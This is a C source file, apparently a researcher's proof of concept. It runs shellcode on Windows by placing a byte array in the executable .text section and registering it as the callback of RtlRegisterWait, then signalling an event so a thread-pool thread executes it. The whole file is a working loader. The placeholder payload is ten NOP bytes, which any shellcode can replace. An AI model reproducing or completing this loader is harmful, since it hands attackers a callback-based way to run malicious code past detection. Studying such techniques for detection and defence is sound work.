/*
[*] RtlRegisterWait Shellcode Execution PoC 
[*] Author: Osanda Malith Jayathissa - @OsandaMalith
[*] www.osandamalith.com
[*] Date: 13/10/2025
*/

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* RtlRegisterWait_t)(
    PHANDLE WaitHandle,
    HANDLE Handle,
    PVOID Callback,
    PVOID Context,
    ULONG Milliseconds,
    ULONG Flags
    );

typedef NTSTATUS(NTAPI* RtlDeregisterWait_t)(
    HANDLE WaitHandle
    );

#pragma section(".text")
__declspec(allocate(".text")) unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

int main() {
    puts("[*] RtlRegisterWait Shellcode Execution PoC");
    puts("[*] Author: Osanda Malith Jayathissa - @OsandaMalith");
    puts("[*] www.osandamalith.com\n");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    RtlRegisterWait_t RtlRegisterWait = (RtlRegisterWait_t)GetProcAddress(ntdll, "RtlRegisterWait");
    RtlDeregisterWait_t RtlDeregisterWait = (RtlDeregisterWait_t)GetProcAddress(ntdll, "RtlDeregisterWait");
  
    printf("[+] RtlRegisterWait at: 0x%p\n", RtlRegisterWait);
    printf("[+] Shellcode at: 0x%p\n\n", shellcode);

    // Create an event to wait on
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent) {
        printf("[-] CreateEvent failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Event created: 0x%p\n", hEvent);

    // Registers a wait callback that executes when an object is signalled
    HANDLE hWait = NULL;
    auto status = RtlRegisterWait(
        &hWait,
        hEvent,
        shellcode,           // Shellcode as callback
        NULL,           
        INFINITE,       // Wait forever until signalled
        WT_EXECUTEONLYONCE
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] RtlRegisterWait failed: 0x%X\n", status);
        CloseHandle(hEvent);
        return status;
    }

    printf("[+] Wait registered successfully\n");
    printf("[+] Shellcode registered as callback\n\n");
    printf("[*] Signaling event to trigger shellcode...\n");
    Sleep(500);  

    // Signal the event - this triggers the shellcode!
    if (!SetEvent(hEvent)) printf("[-] SetEvent failed: %d\n", GetLastError());
    else {
        printf("[+] Event signaled!\n");
        printf("[+] Shellcode should execute now...\n\n");
    }

    // Give the callback time to execute
    Sleep(1000);
    if (RtlDeregisterWait && hWait) RtlDeregisterWait(hWait);   
    CloseHandle(hEvent);

    return 0;
}
